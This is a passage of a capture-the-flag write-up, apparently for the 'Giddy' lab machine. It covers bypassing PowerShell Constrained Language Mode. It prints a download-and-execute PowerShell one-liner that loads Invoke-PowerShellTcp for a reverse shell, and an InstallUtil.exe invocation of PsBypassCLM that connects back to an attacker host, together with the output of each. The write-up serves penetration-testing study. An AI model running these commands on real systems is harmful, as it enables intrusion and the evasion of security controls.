+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">cat</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">APPDATA</span><span class="nx">\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><span class="w">
+
+</span><span class="n">net</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">unifivideoservice</span><span class="w">
+</span><span class="bp">$ExecutionContext</span><span class="o">.</span><span class="nf">SessionState</span><span class="o">.</span><span class="nf">LanguageMode</span><span class="w">
+</span><span class="n">Stop-Service</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">Unifivideoservice</span><span class="w"> </span><span class="nt">-Force</span><span class="w">
+</span><span class="n">Get-Service</span><span class="w"> </span><span class="nt">-Name</span><span class="w"> </span><span class="nx">Unifivideoservice</span><span class="o">****</span><span class="w">
+</span><span class="n">whoami</span><span class="w">
+</span><span class="nx">Get-Service</span><span class="w"> </span><span class="nt">-ServiceName</span><span class="w"> </span><span class="nx">UniFiVideoService</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<h1 id="ps-bypass-clm">PS Bypass-CLM</h1>
+<p>PowerShell Constrained Language is a language mode of PowerShell designed to support day-to-day administrative tasks, yet restrict access to sensitive language elements that can be used to invoke arbitrary Windows APIs.</p>
+
+<p>PowerShell v5 detects when AppLocker Allow mode is in effect and sets the PowerShell language to Constrained Mode, severely limiting the attack surface on the system.</p>
+
+<p>If I run any powershell script like <code class="language-plaintext highlighter-rouge">Invoke-PowerShellTcp</code> to get a reverse-shell or <code class="language-plaintext highlighter-rouge">PowerUp.ps1</code> for enumeration it gives:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Stacy</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">powershell</span><span class="w"> </span><span class="nx">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://10.10.14.5/Invoke-PowerShellTcp.ps1'</span><span class="p">);</span><span class="n">Invoke-PowerShellTcp</span><span class="w"> </span><span class="nt">-Reverse</span><span class="w"> </span><span class="nt">-IPAddress</span><span class="w"> </span><span class="nx">10.10.14.5</span><span class="w"> </span><span class="nt">-Port</span><span class="w"> </span><span class="nx">4444</span><span class="w">
+</span><span class="n">Cannot</span><span class="w"> </span><span class="nx">create</span><span class="w"> </span><span class="nx">type.</span><span class="w"> </span><span class="nx">Only</span><span class="w"> </span><span class="nx">core</span><span class="w"> </span><span class="nx">types</span><span class="w"> </span><span class="nx">are</span><span class="w"> </span><span class="nx">supported</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">this</span><span class="w"> </span><span class="nx">language</span><span class="w"> </span><span class="nx">mode.</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>To confirm Language mode is constrained:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Stacy</span><span class="err">&gt;</span><span class="w"> </span><span class="bp">$ExecutionContext</span><span class="o">.</span><span class="nf">SessionState</span><span class="o">.</span><span class="nf">LanguageMode</span><span class="w">
+</span><span class="nx">ConstrainedLanguage</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>CLM can be bypass with this tool: <a href="https://github.com/padovah4ck/PSByPassCLM">PSByPassCLM</a> which even offers a reverse-shell with <code class="language-plaintext highlighter-rouge">FullLanguage</code>.</p>
+
+<p>I built the solution file while changing the target .NET framework as 4.5, rest weren’t working.
+I can get the Version for .NET installed in giddy by visiting <code class="language-plaintext highlighter-rouge">C:\Windows\Microsoft.NET\Framework</code></p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Windows\Microsoft.NET\Framework</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">dir</span><span class="w">
+
+</span><span class="n">Mode</span><span class="w">                </span><span class="nx">LastWriteTime</span><span class="w">         </span><span class="nx">Length</span><span class="w"> </span><span class="nx">Name</span><span class="w">
+</span><span class="o">----</span><span class="w">                </span><span class="o">-------------</span><span class="w">         </span><span class="o">------</span><span class="w"> </span><span class="o">----</span><span class="w">
+</span><span class="n">d-----</span><span class="w">        </span><span class="nx">8/16/2021</span><span class="w">  </span><span class="nx">12:38</span><span class="w"> </span><span class="nx">PM</span><span class="w">                </span><span class="nx">v4.0.30319</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre></td><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe</span><span class="w"> </span><span class="nx">/logfile</span><span class="o">=</span><span class="w"> </span><span class="n">/LogToConsole</span><span class="o">=</span><span class="n">true</span><span class="w"> </span><span class="nx">/revshell</span><span class="o">=</span><span class="n">true</span><span class="w"> </span><span class="nx">/rhost</span><span class="o">=</span><span class="mf">10.10</span><span class="o">.</span><span class="nf">14</span><span class="o">.</span><span class="nf">5</span><span class="w"> </span><span class="n">/rport</span><span class="o">=</span><span class="mi">443</span><span class="w"> </span><span class="n">/U</span><span class="w"> </span><span class="nx">c:\windows\system32\spool\drivers\color\PsBypassCLM.exe</span><span class="w">
+
+</span><span class="n">Microsoft</span><span class="w"> </span><span class="p">(</span><span class="n">R</span><span class="p">)</span><span class="w"> </span><span class="o">.</span><span class="nf">NET</span><span class="w"> </span><span class="n">Framework</span><span class="w"> </span><span class="nx">Installation</span><span class="w"> </span><span class="nx">utility</span><span class="w"> </span><span class="nx">Version</span><span class="w"> </span><span class="nx">4.6.1586.0</span><span class="w">
+</span><span class="n">Copyright</span><span class="w"> </span><span class="p">(</span><span class="n">C</span><span class="p">)</span><span class="w"> </span><span class="n">Microsoft</span><span class="w"> </span><span class="nx">Corporation.</span><span class="w">  </span><span class="nx">All</span><span class="w"> </span><span class="nx">rights</span><span class="w"> </span><span class="nx">reserved.</span><span class="w">
+</span><span class="n">The</span><span class="w"> </span><span class="nx">uninstall</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">beginning.</span><span class="w">
+</span><span class="n">See</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">contents</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">log</span><span class="w"> </span><span class="nx">file</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">c:\windows\system32\spool\drivers\color\PsBypassCLM.exe</span><span class="w"> </span><span class="nx">assembly</span><span class="s1">'s progress.
+The file is located at .
+Uninstalling assembly '</span><span class="nx">c:\windows\system32\spool\drivers\color\PsBypassCLM.exe</span><span class="s1">'.
+Affected parameters are:
+   assemblypath = c:\windows\system32\spool\drivers\color\PsBypassCLM.exe
+   rport = 443
+   revshell = true
+   rhost = 10.10.14.5
+   logtoconsole = true
+   logfile =
+Trying to connect back...
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>And I get a shell, Checking Language on that shell:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Users\Stacy\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
+</span><span class="n">giddy\stacy</span><span class="w">
+</span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\Users\Stacy\Documents</span><span class="err">&gt;</span><span class="w"> </span><span class="bp">$ExecutionContext</span><span class="o">.</span><span class="nf">SessionState</span><span class="o">.</span><span class="nf">LanguageMode</span><span class="w">
+</span><span class="nx">FullLanguage</span><span class="w">
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+:ET
